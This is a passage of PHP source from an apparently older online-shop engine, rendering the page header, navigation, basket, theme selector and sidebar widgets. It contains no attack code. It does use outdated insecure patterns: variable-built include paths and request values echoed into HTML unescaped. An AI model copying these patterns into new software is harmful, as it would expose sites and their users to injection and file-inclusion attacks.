include ("./templates/$template/meta.inc");
}
echo $taggs;
require ("./templates/$template/title.inc");
if ($usetheme==0) {
echo str_replace("[nc10]", str_replace("#", "", $nc10), str_replace("[lnc10]", str_replace("#", "",lighter($nc10,50)), $css));
} else {
$themecontent= $css.$themecontent;
}
require ("./modules/stat.php");
require ("./modules/tags.php");
if ($smod=="shop") {

$korz="<a href=\"$htpath/index.php?action=basket&flag=$speek\"><i class=icon-shopping-cart></i> <b id=\"scart\">0</b>&nbsp;".str_replace(" ", "&nbsp;", $currencies_sign[$_SESSION["user_currency"]])."</a>";

} else {$korz="";}
if (($valid=="1")&&($details[7]=="VIP")){ $vipskidka="<div><div align=center><font color=\"".$style['nav_col1']."\" size=4><b>".($vipprocent*100)."% ".$lang[233]."</b>!</font></div>
<font color=\"".$style['nav_col3']."\"><small><b>".$lang[234]."</b><br>
".$lang[235]."</small></font></div>"; } else { $vipskidka=""; }
if ($action=="clear"){ $cart->empty_cart(); $action="basket"; }
$items=$cart->get_all();

$fids = $cart->get_fids();
$basket="";
$oform="";
$full_basket="";
$print_basket="";
$tovarov=0;
$stuks=0;
$summa=0;




$tovarov = $cart->itemcount; $summa = $cart->total;  $tovarov = $cart->itemstuks;
$full="";
if ($tovarov>0){
$full=1;

$korz="<a href=\"$htpath/index.php?action=basket&flag=$speek\"><span class=basketfont><i class=icon-shopping-cart></i> <b id=\"scart\">".$summa."</b>&nbsp;".str_replace(" ", "&nbsp;", $currencies_sign[$_SESSION["user_currency"]])."</font></span></a>";

}
if (($header_type>=2)&&($usetheme==0)) {
if ($valid=="0"){  $enter="<li class=f1><a href=\"$htpath/index.php?register=1\"><small>&nbsp;".$lang[39]."</small></a></li>";} else { $enter="<li class=f1><a href=\"$htpath/index.php?logout=1\"><small><i class=\"icon-share\"></i>&nbsp;".$lang['exit']."</small></a></li>";}
} else {
if ($valid=="0"){ $enter="<span class=regfont><a href=\"$htpath/index.php?register=1\"><i class=\"icon-user\"></i>&nbsp;".$lang[39]."</a></span>";} else {  $enter="<span class=regfont><a href=\"$htpath/index.php?logout=1\"><i class=\"icon-share\"></i>&nbsp;".$lang['exit']."</a></span>";}
}

require ("./modules/auth.php");
if ($viewsite==1) {
$strtt=Array();
$strtt[""]="";
$ftfs=0;
unset($f6);
$handle=opendir('./themes/');
while (($f6 = readdir($handle))!==FALSE) {
if (($f6 == '.') || ($f6 == '..') || (substr($f6,-5) != 'thtml')) {
continue;
} else {
$filethtmls[$f6]=str_replace(".thtml","", $f6);
$ftfs+=1;
}
}
closedir($handle);
unset($f6);

$colortw="";

$cvetf="./templates/$template/colors/themes.txt";
if (@file_exists($cvetf)==TRUE) {
$cvetmas=file($cvetf);
while (list ($numcv, $linecv) = @each ($cvetmas)) {
$strtt[$numcv]=strtoken($linecv,"|");
$colortw.= "<option value=\"#$numcv\">#$numcv ".$strtt[$numcv]."</option>\n";

}
}
@sort ($filethtmls);
@reset($filethtmls);
$thtmls="TEST: <form id=\"zemes\" name=\"zemes\" action=".$_SERVER['PHP_SELF']." method=GET>
<input type=hidden name=\"catid\" value=\"$catid\">
<input type=hidden name=\"action\" value=\"$action\">
<input type=hidden name=\"page\" value=\"$page\">
<input type=hidden name=\"query\" value=\"$query\">
<input type=hidden name=\"unifid\" value=\"$unifid\">
<select name=\"zeme\" onchange=\"javascript:document.zemes.submit()\"><option selected value=\"".str_replace("themes/","",str_replace(".thtml", "", $theme_file))."\">\n".strtoupper(str_replace(".thtml", "", str_replace("themes/","", $theme_file)))."</option>\n";

while (list ($line_num, $line) = @each ($filethtmls)) {
$thtmls.="<option value=\"".str_replace(".thtml", "", str_replace("themes/", "", $line))."\">\n".strtoupper(str_replace(".thtml", "", $line))."</option>\n";
}
$numczeme=str_replace("#","", $czeme);
$thtmls.="<option value=\"default\">".$lang[275]."</option></select> + <select name=\"czeme\" onchange=\"javascript:document.zemes.submit()\"><option selected value=\"#".$numczeme."\">#".$numczeme." ".$strtt[$numczeme]."</option>\n$colortw</select></form>";
if ($r!="All") {
$needcol=@$colordirs["$r"];
$needlogo=@$logodirs["$r"];
if ($needcol!="") {$nc10=$needcol;}
$catbut=str_replace("<!-- #1$r -->", "<span><img src=images/pix.gif width=1 height=$bheight align=absmiddle>", str_replace("<!-- #2$r -->", "</span>", $catbut));
} else {
$needcol=@$colordirs["$r $sub "];
$needlogo=@$logodirs["$r $sub "];
if ($needcol!="") {$nc10=$needcol;}
//$catbut=str_replace("<!-- #1$r $sub -->", "<span><img src=images/pix.gif width=1 height=$bheight align=absmiddle>", str_replace("<!-- #2$r $sub -->", "</span>", $catbut));

}
require ("./templates/$template/nav_menu.inc");


if ($valid=="0"){$usermenu=$usermenu1;} else {$usermenu=$usermenu2;}
if (preg_match("/\%/", $style ['shop_width'])==true) {$shwid=$style ['shop_width']; $innerdiv=(doubleval($style ['shop_width'])-5)."%"; } else {$shwid=$style ['shop_width']."px"; $innerdiv=(doubleval($style ['shop_width'])-20)."px";}
}
echo "</head><body bgcolor=\"".$style['tbgcolor']."\" topmargin=\"0\" leftmargin=\"0\" rightmargin=\"0\" bottommargin=\"0\" marginwidth=\"0\" marginheight=\"0\">";
if ($viewsite==1) {
if ($usetheme==0) { echo "<table width=100% cellpadding=0 cellspacing=0 border=0><tr><td width=100% align=center>"; }

require ("./modules/warning.php");
if ((!@$query) || (@$query=="")){ $query=""; }
$themecontent=str_replace("[minibasket]","<a href=\"$htpath/index.php?action=basket&flag=$speek\">".str_replace(" ", "&nbsp;", $lang[35]).":</a><br><font color=".lighter($nc3,-80)."><b id=\"scart\">".$summa."</b>"." ".$currencies_sign[$_SESSION["user_currency"]]."</font>",$themecontent);
$themecontent=str_replace("[loginout]","$loginout",$themecontent);

$searchmenu=str_replace("[searchstyle]", " style=\"color: $nc5; border: 1px solid ".lighter($nc10,-20)."; padding: 2px; height:20px; width:100%; font-size: 8pt; background-color: ".lighter($nc10,-10)."; background-image: url('grad.php?h=10&w=1&e=".str_replace("#","",lighter($nc10,-10))."&s=".str_replace("#","",lighter($nc10,-20))."&d=crystal'); background-repeat: repeat-x\"", str_replace("[searchbuttonstyle]", " style=\"color: $nc5; border: 1px solid ".lighter($nc10,-20)."; padding: 2px; font-size: 9pt; background-image: url('grad.php?h=25&w=1&e=".str_replace("#","",lighter($nc10,-20))."&s=".str_replace("#","",$nc10)."&d=vertical'); background-repeat: repeat-x\"", $searchmenu));
$logo_shop="<table cellpadding=3 cellspacing=0 border=0><tr><td><img src=\"".$image_path."/pix.gif\" border=0 width=10 height=1></td><td align=left><table border=0 cellpadding=0 cellspacing=0><tr><td valign=middle align=left width=100%><a href=\"$htpath\" title=\"".str_replace("\'", "",str_replace("\"", "", strip_tags($lang['mainsite']." : $shop_name")))."\">".str_replace("<img ", "<img border=0 ",$logotype)."</a></td></table></td>";
if ($view_only_logo==0) {$logo_shop.="<td><a href=\"$htpath\"><font size=6 color=\"[nc9]\"><b><i>$shop_logo</i></b></font></a><br><span style=\"font-size:smaller;letter-spacing: 2px;\"><font color=\"[nc9]\">$curlan&nbsp;$kwrd</font></span></font></td>";} $logo_shop.="</tr></table>"; if ($smod!="shop") {$catbut="";}
if ($catbut_css_style==1) { $trt="<i class=\"icon-chevron-right icon-white\"></i>&nbsp;";  } else { if ($nav_pos==1) {$trt="<i class=\"icon-chevron-right icon-white\"></i>&nbsp;"; } else { $trt="<img src=$image_path/pix.gif width=1 height=$bheight border=0>";}}

if ($nav_pos==0) {$trt=""; $colr="";$nncf = "$base_loc/navigate.txt";if ($view_mainbut==1) {if (@file_exists("$nncf")) {$navi1=file("$nncf");$bblr=0; natcasesort($navi1);
while (list ($linu, $lili) = @each ($navi1)) {$brl="";$brl2=0;$bblr+=1;if (($opage=="")&&($bblr==1)&&($action=="x")&&($catid=="0")&&($unifid=="")&&($item_id=="")) { $brl="$trt"; $brl2=40; }else {if (@preg_match("/page=".$rpage."/i", $lili)) {$brl="$trt"; $brl2=40;}}$lili=str_replace($nc0,$nc5,$lili);
if ($opage=="") {$brl2=0;}
if ($brl2>0) {$lili="<img src=images/pix.gif width=1 height=$bheight align=absmiddle>".$lili;}
if ($usetheme==0) {
$colr.="<td valign=bottom>".str_replace($onc0, $nc0, navbut("$brl".$lili, $nc10,$brl2,$nc0))."</td>";
} else {
$colr.="<td valign=bottom>".str_replace($nc0, $nc5, navbut("$brl".$lili, $nc10,$brl2,$oldnc8))."</td>";}

}}}
$navibutton="<table border=0 cellpadding=0 cellspacing=0><tr>$colr</tr></table>";$navigator=""; $navigator.="<div align=center><center><table border=0 style=\"width:$shwid;\" cellpadding=0 cellspacing=0><tr><td>&nbsp;&nbsp;&nbsp;</td>";$navigator.=$colr."<td valign=bottom>$catbut</td><td><img src=\"$image_path/pix.gif\" width=10 height=".($bheight+18)."></td>";


if($nav_pos==0) {$nwc0=$nc0;} else {$nwc0=$nc10;}
$navigator.="<td valign=middle width=100% align=right><table cellspacing=0 cellpadding=0 border=0><tr><td>$choosecurrency</td><td><img src=\"$image_path/pix.gif\" width=5 height=8 border=0></td><td align=right valign=middle>$lngv</td><td valign=middle class=nowrap>$enter</td><td>&nbsp;&nbsp;&nbsp;</td></tr></table></td></tr></table></center></div>";
} else {
$navigator="<div align=center><table width=\"100%\" border=0 cellspacing=0 cellpadding=0 bgcolor=$nc0 class=dropdown-submenu><tr><td colspan=2 bgcolor=".lighter($nc10,10)."><img src=\"$image_path/pix.gif\" width=10 height=1 border=0></td></tr><tr><td bgcolor=$nc10 valign=middle background=\"grad.php?h=38&w=1&e=".str_replace("#","",$nc10)."&s=".str_replace("#","",lighter($nc10,10))."&d=vertical\">&nbsp;&nbsp;&nbsp;</td><td bgcolor=$nc10 valign=middle background=\"grad.php?h=38&w=1&e=".str_replace("#","",$nc10)."&s=".str_replace("#","",lighter($nc10,10))."&d=vertical\" align=center><table align=\"center\" border=\"0\"  style=\"width:$shwid;\" cellspacing=\"0\" cellpadding=\"0\"><tr>";$nncf = "$base_loc/navigate.txt";
$colr="";

if ($view_mainbut==1) {

if (@file_exists("$nncf")) {


$navi1=file("$nncf");  natcasesort($navi1);
$bblr=0;
while (list ($linu, $lili) = @each ($navi1)) {
$brl="";$brl2=0;$bblr+=1;
if (($opage=="")&&($bblr==1)&&($action=="x")&&($catid=="0")&&($unifid=="")&&($item_id==""))  {
$brl=""; $brl2=20;
} else {
if (@preg_match("/page=".$rpage."/i", $lili)&&($opage!="")) { $brl="$trt"; $brl2=20;}}if ($needcol==""){if ($usetheme==0) {$colr.="<td valign=top>".str_replace($onc0, $nc0, navbut2($brl.$lili, lighter($nc10,-21),$brl2,$nc10))."</td>"; } else {
$colr.="<td valign=bottom>".str_replace($nc0, $nc5, navbut($brl."$lili", $oldnc10,$brl2,$oldnc10))."</td>";}} else {
if ($usetheme==0) {$searchmenu=str_replace(str_replace("#","",lighter($oldnc10,-10)),str_replace("#","",lighter($nc10,-10)),str_replace(str_replace("#","",lighter($oldnc10,-20)),str_replace("#","",lighter($nc10,-20)),str_replace(str_replace("#","",$oldnc10),str_replace("#","",$nc10),$searchmenu)));$colr.="<td valign=top>".navbut2($brl.$lili, lighter($nc10,-21),$brl2,$nc10)."</td>";
} else {
$searchmenu=str_replace(str_replace("#","",lighter($oldnc10,-10)),str_replace("#","",lighter($nc10,-10)),str_replace(str_replace("#","",lighter($oldnc10,-20)),str_replace("#","",lighter($nc10,-20)),str_replace(str_replace("#","",$oldnc10),str_replace("#","",$nc10),$searchmenu)));
$colr.="<td valign=bottom>".str_replace($nc0, $nc5,navbut($brl.$lili, $oldnc10,$brl2,$nc8))."</td>";

}}}}}
$navibutton="<table border=0 cellpadding=0 cellspacing=0><tr>$colr</tr></table>";
$navigator.=$colr;
$navigator.= "<td valign=middle width=100% align=right><table border=0 cellspacing=1 cellpadding=2><tr><td>$choosecurrency</td><td valign=middle>$lngv</td><td valign=middle>$enter</td></tr></table></td></tr></table></td></tr></table></div>";
}

if ($usetheme==0) {$vallnu="";$logo_shop=str_replace("grad.php", "grad.php?h=40&w=1&e=".str_replace("#", "",  lighter($nc2,-20))."&s=".str_replace("#", "", lighter($nc2,20))."&d=vertical", str_replace("[nc0]", $nc0, str_replace("[nc1]", $nc1, str_replace("[nc2]", $nc2,str_replace("[nc3]", $nc3, str_replace("[nc4]", $nc4, str_replace("[nc5]", $nc5, str_replace("[nc6]", $nc6, str_replace("[nc7]", $nc7, str_replace("[nc8]", $nc8, str_replace("[nc9]", $nc9, str_replace("[nc10]", $nc10, $logo_shop))))))))))));require("./templates/$template/header.inc");
$x0003="";
require ("./modules/x0003.php");
if ($header_type>=2) {
echo "<div align=center><table width=\"100%\" border=0 cellspacing=0 cellpadding=0 bgcolor=$nc0 class=\"dropdown-submenu\"><tr><td bgcolor=".$nc10;if ($nav_pos==0) {echo " background=\"grad.php?h=45&w=1&e=".str_replace("#","",$nc10)."&s=".str_replace("#","",lighter($nc10,10))."&d=vertical\"";}
echo " align=center>";
require "./modules/mod_callback.php";
} else {
echo "<div align=center><table width=\"100%\" border=0 cellspacing=0 cellpadding=0 bgcolor=$nc0 class=\"dropdown-submenu\"><tr><td bgcolor=".$nc10;if ($nav_pos==0) {echo " background=\"grad.php?h=45&w=1&e=".str_replace("#","",$nc10)."&s=".str_replace("#","",lighter($nc10,10))."&d=vertical\"";}
echo " align=center><table border=0 style=\"width:$shwid;\" cellpadding=3 cellspacing=0><tr>";
echo "<td align=left>$searchmenu</td><td align=right>";
echo "<table border=0 cellpadding=0 cellspacing=0><tr><td><small>".str_replace(" ", "&nbsp;", $zak_po)."&nbsp;&nbsp;&nbsp;&nbsp;</small></td><td><img src=\"$image_path/phone.png\" border=0 hspace=5></td><td><font size=3 color=\"$nc5\"><b>".str_replace(" ", "&nbsp;", $telef)."</b></font>";
require "./modules/mod_callback.php";
if ($icquin!="") {$icquin=str_replace("-", "", str_replace(" ", "",$icquin)); echo "</td><td>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://www.icq.com/whitepages/cmd.php?uin=$icquin&action=message\"><img src=\"http://status.icq.com/online.gif?icq=$icquin&img=27&rnd=".time()."\" border=0></a> <a href=\"http://www.icq.com/whitepages/cmd.php?uin=$icquin&action=message\"><font color=$nc5>ICQ $icquin</font></a>";} if (($header_type==2)||($header_type==3)) { echo "</td><td><img src=$image_path/pix.gif border=0 width=20 height=20></td><td>$enter";} echo "</td></tr></table></td></tr></table></td></tr>
";
}
echo "<tr><td align=center class=panel><div class=navbar style=\"width:100%; margin-bottom: 0px;\" align=center>
<div style=\"width:$shwid;\" align=center><ul class=nav>$navmenu";
if ($smod=="shop") {echo $topmenu;}
echo"</ul></div></div></td></tr></table></div>";
top($rw0, $rw2, "100%", strtolower($style ['sale']), strtolower($style ['bg_content']),0, 0, "[rw]");} else {top("", $searchmenu, "100%", strtolower($style ['sale']), strtolower($style ['bg_content']),0, 0, "[search]");top("", str_replace("</a>", "</a>&nbsp;&nbsp;", $lngv), "100%", strtolower($style ['sale']), strtolower($style ['bg_content']),0, 0, "[flags]");}
if ($valid=="1") {$_SESSION["auth_times"]=0; $au=0;}


if (($catid!="0")&&($catid!="")&&($catid!="_")) {$repcatid=$catid;}
if ($usetheme==0) {
if ($affix==1) {
if ($_SESSION["mclosed"]=="1") {
$fxhid=" hidden";
echo "<div id=SMenu style=\"left:-15px; position:fixed; z-index:1601;\"><a class=\"btn pd0\" style=\"background: $nc1;\" href=#menushow onclick=MenuShow()><i class=\"icon-chevron-right icon-large\"></i></a></div>
<div id=\"wrapper\" class=smenu2>";
}  else {
$fxhid="";
echo "<div id=SMenu style=\"left:-15px; position:fixed; z-index:1601;\"><a class=\"btn pd0\" style=\"background: $nc1;\" href=#menushow onclick=MenuClose()><i class=\"icon-chevron-left icon-large\"></i></a></div>
<div id=\"wrapper\" class=smenu>";
}
}
echo "<table align=\"center\" style=\"width:$shwid\" cellspacing=\"0\" cellpadding=\"0\" border=0><tr>";
if (($incart_menu==0)&&($unifid!="")&&($catid==""))
{ } else {
if ($leftmenu==1) { if ($affix==1) { echo "<td valign=\"top\" align=\"left\" style=\"width:".$style['left_width'].";\">
<script>
	$(document).ready(function(){
            $('#sidebar').stickyMojo({footerID: '#footer', contentID: '#main'});
            $('#sidebar').mCustomScrollbar({theme:\"dark2\",
            scrollInertia: 0,
            autoDraggerLength: true,
            advanced: {
            	normalizeMouseWheelDelta: true,
                updateOnContentResize: true,
                updateOnBrowserResize: true
                },
            scrollButtons: {enable: false}
		  });
          ";
if ($bb!="") { echo  "var elID=\"#bb_".$bb."\";
$('#sidebar').mCustomScrollbar(\"scrollTo\",elID);";
}
          echo"
          });
function MenuShow() {
document.getElementById('wrapper').className='smenu';
document.getElementById('SMenu').innerHTML=\"<a class='btn pd0' style='background: $nc1;' href=#MenuClose onclick=MenuClose()><i class='icon-chevron-left icon-large'><i></a>\";
document.getElementById('sidebar').className='affixbox';
document.getElementById('main').style.width='".(doubleval($style['center_width'])-doubleval($style['affix_width']))."%';
RefreshMwnu();
}
function MenuClose() {
document.getElementById('wrapper').className='smenu2';
document.getElementById('SMenu').innerHTML=\"<a class='btn pd0' style='background: $nc1;' href=#MenuShow onclick=MenuShow()><i class='icon-chevron-right icon-large'><i></a>\";
document.getElementById('sidebar').className='hidden';
document.getElementById('main').style.width='".doubleval($style['center_width'])."%';
RefreshMwnu();
}
function RefreshMwnu() {
var scriptNode = document.createElement('script');
document.getElementsByTagName('head')[0].appendChild(scriptNode);
scriptNode.language='javascript';
scriptNode.src = '$htpath/mclose.php?t=".time()."';
scriptNode.type = 'text/javascript';
}

</script>

<div id=\"sidebar\" class=\"affixbox".$fxhid."\">
        <div align-center><table border=0 style=\"margin-top:40px; margin-bottom:5px;\" cellpadding=3><tr><td><a href=\"/\" title=\"$kwrd\"><img src=logo_mini.png border=0></a></td><td><b class=\"lnk small\"><a href=\"/\" title=\"$kwrd\"><font color=$nc9>$kwrd</font></a></b></td></tr></table></div>
       <div class=\"sidebar_inner\">
      ";
        } else {
		if (($page!="") &&($view_left_menu_page==0)&&($view_left_menu_page==0)&&($view_itemsmenu_page==0))
		{
		}else {
        echo "<td valign=\"top\" align=\"left\" style=\"width:".$style['left_width']."\"><img src=\"images/pix.gif\" width=\"".$style['right_width']."\" height=\"1\" border=0>";
        }
		}
      }
   }
}
if (($incart_menu==0)&&($unifid!="")&&($catid=="")) { } else {
if ($leftmenu==1) {
if ($_SESSION["user_module"]!="site") {
require("./modules/dirs.php");


if (($action!="zakaz")&&($action!="basket")&&($action!="send")&&($view_bask!=0)&&(substr($catid,-1)=="_")) {

topwo("", "<div align=left>".jsbbb("jsbask")."</div>", $style ['right_width'], $nc0, $nc0, 5,0,"[main_basket]");

}

if (($smod=="shop")&&($action!="allbrands")&&($brandtype==1)){

require ("./modules/brands.php");
top ($lang[355], $brandslist, "100%", strtolower($style ['new']), strtolower($style ['left_menu']), 2,0, "[brandlist]");

}

if ($catid==""){$catidy=@$podstava["".@$dir."|".@$subdir."|"];}else{$catidy=$catid;}

if ((@file_exists("$base_loc/db_spec_$catidy.txt"))&&($view_spec=="1")) { } else {$catidy="_";}
if ((@file_exists("$base_loc/db_spec_$catidy.txt"))&&($view_spec=="1")&&($mod!="admin")) {
if ($usetheme==0) {$spectit="<div align=center><span class=\"label label-info\">".$lang[236]."</span></div>";} else {$spectit="";}


$oldperpage=$perpage;


if ($smod=="shop"){

$last_vc=$varcart;
$last_cg=$cols_of_goods;
$cols_of_goods=$spec_cols;
$varcart=$varcart_of_spec;

$last_bb=$view_buybut;
$last_qt=$view_list_qty;
$view_list_qty=0;
$view_buybut=0;
$perpage=$lastgoods_perpage;
require ("./templates/$template/view.inc");
require ("./modules/spec.php");
$view_buybut=$last_bb;
$view_list_qty=$last_qt;
$varcart=$last_vc;
$cols_of_goods=$last_cg;

}

if ($catidy=="_") { $glav=" ".$lang[276]; } else {$glav="";}
if(($details[7]=="ADMIN")||($details[7]=="MODER")){
if (($valid=="1")){
$specadmi= "<span class=\"label label-info\">".$lang[236]."</span><br>$carat <span class=lnk><a href=\"$htpath/index.php?clear_spec=$catidy&catid=$catid&unifid=$unifid\">".$lang['del']."$glav</a></span><br>$carat <span class=lnk><a href=\"$htpath/index.php?clear_spec=all&catid=$catid&unifid=$unifid\">".$lang[237]."</a></span><br><br>";
$spec_spisok.=$specadmi;
}
}

top("", "$spectit$spec_spisok", "100%",  $nc0, $nc0 , "noshadow",1, "[specpr]");




}

if ((@file_exists("$base_loc/top10_index.txt"))&&($view_top10=="1")&&($mod!="admin")) {
$pageopent10 = fopen ("$base_loc/top10_index.txt" , "r");
$viewpage_contentt10 = @fread($pageopent10, @filesize("$base_loc/top10_index.txt"));
fclose ($pageopent10);

top("", "<b>TOP-10:</b><br>$viewpage_contentt10<br> <small>* ".$lang[274]."</small>", $style ['center_width'], $nc4, strtolower($style ['bg_anounses']), 4,0,"[top10]");

}

}
}
}


require "./modules/allsite.php";
if ($action=="clear_h") {
$_SESSION["interest"]="";

}
if($usetheme==1) { $x0003="";
require ("./modules/x0003.php");}
if (($incart_menu==0)&&($unifid!="")&&($catid=="")) {  } else {
if ($leftmenu==1) {
if (($view_interest==1)&&($mod!="admin")){

$clear_i="";
if (@$_SESSION["interest"]!="") {
topwo("", "<br><script>
function clear_h() {
var scriptNode = document.createElement('script');
document.getElementsByTagName('head')[0].appendChild(scriptNode);
scriptNode.language='javascript';
scriptNode.src = '$htpath/clearh.php?t=".time()."';
scriptNode.type = 'text/javascript';
document.getElementById('clearh').style.display='none';
}
</script><div class=box5 align=left id=clearh style=\"padding:10px 10px 10px 10px;\"><div><b>".$lang[273]."</b></div>".$_SESSION["interest"]."<br><div align=center><a class=btn onclick=clear_h();>".$lang['clear']."</a><br><br></div></div>", "100%", $nc2, $nc0, "noshadow",1,"[viewed]");

}
}
if ($view_avatara==1){
top ("", "<div align=center><b><a href=\"#avatara\" onclick=\"javascript:window.open('avatara.php?speek=$speek','avatara','status=no,scrollbars=yes,menubar=no,resizable=yes,location=no,width=600,height=550,left=10,top=10')\"><font color=$nc4>".$lang[414]."</font></a></b><br><br><a href=\"#avatara\" onclick=\"javascript:window.open('avatara.php?speek=$speek','avatara','status=no,scrollbars=yes,menubar=no,resizable=yes,location=no,width=600,height=550,left=10,top=10')\"><img class=img src=\"$image_path/eve.png\" border=0><br><b>".$lang[411]."</b></a><br><br><div align=justify><small><font color=$nc5>".$lang[413]."</font></small></div></div><br>", "100%", $nc0, $nc0 , "noshadow",1, "[avatara]");
}
}
}
$complexz="";

$regser="";
if ($valid=="0"){
if ($_SESSION["user_module"]=="shop") {
if ($usetheme==0) {
$regser="<div align=\"center\" class=regfont><a href=\"$htpath/index.php?register=1\"><i class=\"icon-user\"></i>&nbsp;".$lang[39]."</a><br><br><small><i><a href=\"$htpath/index.php?action=restore\">".$lang[86]."</a></i></small></div><br><div align=\"justify\"><img src=\"".$image_path."/znak2.gif\" border=\"0\" vspace=\"5\" hspace=\"5\" align=\"left\"><small>" .$lang['regtext']."</small></div>";
} else {
$regser="<span class=regfont><a href=\"$htpath/index.php?register=1\"><i class=\"icon-user\"></i>&nbsp;".$lang[39]."</a><br><small><a href=\"$htpath/index.php?action=restore\" title=\"".$lang[238]."\" style=\"font-weight: normal; font-style: italic\">".$lang[86]."</a></small></span>";
}
}
} else {
$complexz="";
$userstats="";

if ($smod=="shop") {


require ("./modules/zak.php");
}
if (($incart_menu==0)&&($unifid!="")&&($catid=="")) { } else {
if ($leftmenu==1) {
top("<small>".$lang[30]."</small>", "$complexz", $style ['right_width'], strtolower($style ['goods']), strtolower($style ['bg_user']), 5,0,"[auth]");
}
}
}
if ($regser=="") {
if ($authtype==1) {
$rret="<small><font class=small>".str_replace(" | ", "<br><br>$carat " , str_replace("&nbsp;", " " ,  $enter))."</font></small>";
} else {
$rret=str_replace("&nbsp;", " " ,  $enter);
}
$themecontent=str_replace("[register]",$rret,$themecontent);
}

if (($incart_menu==0)&&($unifid!="")&&($catid=="")) { } else {
if ($leftmenu==1) {
if (($view_anonses=="l")&&($mod!="admin")){
require ("./modules/anonses.php");
top("", "$anonses", $style ['center_width'], $nc0, $nc0, 4,0,"[anounses]");
}

if ($view_birth=="l") {
top("$lang[1497]", "$birthday", "100%", $nc2, $nc0, 5,0,"[birthday]");
}
if ($view_tag_clouds=="l") {
top("", "$tags_cloud", "100%", $nc0, $nc0, 5,0, "[tagclouds]");
}
}
}
require "./templates/$template/work_time.inc";
if (($incart_menu==0)&&($unifid!="")&&($catid=="")) { } else {
if ($leftmenu==1) {
if ($view_office==1) {
if ($links_to_bottom==0) {
top("", "<i class=icon-time></i> <font color=\"".$nc5."\">$wtime</font>", "100%",  $nc0, $nc0, 5,0,"[wtime]");
}
}
}
}

require ("./modules/vremya.php");

$footer="";
$ftgc=doubleval(hexdec(substr(md5("".@$page.@$catid.@$unifid.@$brand.@$start.@$nr.@$action.@$i.@$item_id.@$fr.@$level.@$cl_post.@$message.@$tag.@$month.@$year.$htpath.date("Y/m",time())),0,2)));

$admined="";
if ($interface==1) {
if (($valid=="1")&&($details[7]=="ADMIN")){
$admined.="<div align=center><img src=\"$image_path/handup.png\"></div><div class=round align=center>
<input class=btn type=button onclick=\"javascript:location.href='"."$htpath/index.php?action=template&nt=templates/$template&t=menu"."'\" value=\"".$lang['ch']."\"></div>";
}
}

if ($usetheme==0) {


if (($incart_menu==0)&&($unifid!="")&&($catid=="")) { } else {
if ($leftmenu==1) {
include "./templates/$template/menu.inc";
echo "$admined";
}
}

} else {

if (@file_exists("./templates/$template/menu.inc")==TRUE) {
$pageopen2 = fopen ("./templates/$template/menu.inc" , "r");
$viewpage_content2 = @fread($pageopen2, @filesize("./templates/$template/menu.inc"));
fclose ($pageopen2);
}
$themecontent=str_replace("[menu]","$viewpage_content2$admined",$themecontent);

}
require "./templates/$template/tables.inc";
if ($usetheme==1) {if ($tit=="") {$themecontent=str_replace("[title]"," $carat $shop_name ",$themecontent); }$themecontent=str_replace("[title]",str_replace(" -", " $carat",$tit),$themecontent);}

if ($mod!="admin") {require "./modules/x0001.php"; }
if ($catid==""){$catidy=@$podstava["".@$dir."|".@$subdir."|"];}else{$catidy=$catid;}

if ((@file_exists("$base_loc/db_spec_$catidy.txt"))&&($view_spec=="c")) { } else {$catidy="_";}
if ((@file_exists("$base_loc/db_spec_$catidy.txt"))&&($view_spec=="c")&&($mod!="admin")) {
if ($usetheme==0) {$spectit="<div align=center><span class=\"label label-info\">".$lang[236]."</span></div>";} else {$spectit="";}


$oldperpage=$perpage;


if ($smod=="shop"){

$last_vc=$varcart;
$last_cg=$cols_of_goods;
$cols_of_goods=$spec_cols;
$varcart=$varcart_of_spec;

$last_bb=$view_buybut;
$last_qt=$view_list_qty;
$view_list_qty=0;
$view_buybut=0;
$perpage=$lastgoods_perpage;
require ("./templates/$template/view.inc");
require ("./modules/spec.php");
$view_buybut=$last_bb;
$view_list_qty=$last_qt;
$varcart=$last_vc;
$cols_of_goods=$last_cg;




}





if ($catidy=="_") { $glav=" ".$lang[276]; } else {$glav="";}
if(($details[7]=="ADMIN")||($details[7]=="MODER")){
if (($valid=="1")){
$specadmi= "<span class=\"label label-infp\">".$lang[236]."</span><br>$carat <span class=lnk><a href=\"$htpath/index.php?clear_spec=$catidy&catid=$catid&unifid=$unifid\">".$lang['del']."$glav</a></span><br>$carat <span class=lnk><a href=\"$htpath/index.php?clear_spec=all&catid=$catid&unifid=$unifid\">".$lang[237]."</a></span><br><br>";
$spec_spisok.=$specadmi;

}
}
if (($incart_menu==0)&&($unifid!="")&&($catid=="")) { } else {
if ($leftmenu==1) {
top("", "$spectit$spec_spisok", "100%",  $nc0, $nc0 , "noshadow",1, "[specpr]");
}


}
}

if (($action=="viewfile") && ($page!="")) {

if ($theme_file=="") {
top("", "".$viewpage_content."<br>$razd_links" , $style ['center_width'], strtolower($style ['bg_content']), strtolower($style ['bg_content']) , 0,0,"[content]");
} else {
top("", $viewpage_content."<br>$razd_links" , $style ['center_width'], strtolower($style ['bg_content']), strtolower($style ['bg_content']) , 0,0,"[content]");


}
unset ($all_links);
}

if ($usetheme==0) {
echo "<table width=100% border=0 cellpadding=0 cellspacing=0><tr><td>";}
$jslist="";
if (("$catid"=="0")&&($unifid=="")&&($item_id=="")&&($view_js_allinone==1)&&($mod!="admin")) {
require ("./modules/jscatid.php");
top("", $jslist, $style ['center_width'], $nc0, $nc0, 4,0,"[js_list]");
}
if ($action=="allinone") {
require ("./modules/jscatid.php");
top("", "<h4>".$lang[201].":</h4>".$jslist, $style ['center_width'], $nc0, $nc0, 4,0,"[js_list]");
}

top("", $x0003, $style ['center_width'], $nc0, $nc0, 4,0,"[x0003]");
if ((@$details[1]!="")&&($login!="")&&($password!="")&&(@file_exists("./admin/userstat/".@$details[1]."/user.basket")==TRUE)&&(@$_SESSION["user_basket"]!="ok")&&(substr(@$details[1],0,3)!="vip")){
$oldertime=date("d-m-Y h:i:s", filemtime("./admin/userstat/".@$details[1]."/user.basket"));
if ($action!="older") {if ($action!="olderc") {
if ($smod=="shop") {
if ($older_basket_auto_add==1) {
top("", "<META HTTP-EQUIV=\"Refresh\" CONTENT=\"0;URL=$htpath/index.php?action=add_older\">\n", $style ['right_width'], strtolower($style ['popular']), strtolower($style ['bg_basket']), 5,0,"[content]");
}
